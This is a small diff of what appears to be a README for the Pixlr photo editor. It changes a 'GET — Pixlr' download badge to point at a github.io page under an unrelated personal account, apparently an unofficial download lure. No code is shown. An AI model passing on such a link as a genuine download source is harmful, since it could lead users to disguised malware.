@@ -4,7 +4,7 @@
 <img src="https://fahimai.com/wp-content/uploads/2025/06/Pixlr-Featured-Image.png" alt="Pixlr Online Photo Editor and AI Image Editing Tools" width="780">
 </p>
 
-[![GET — Pixlr](https://img.shields.io/badge/GET-Pixlr-2563eb?style=for-the-badge)](https://penez1995olivar.github.io/.github/)
+[![GET — Pixlr](https://img.shields.io/badge/GET-Pixlr-2563eb?style=for-the-badge)](https://penez1995olivar.github.io/.github/Pixlr)
 
 ---
 
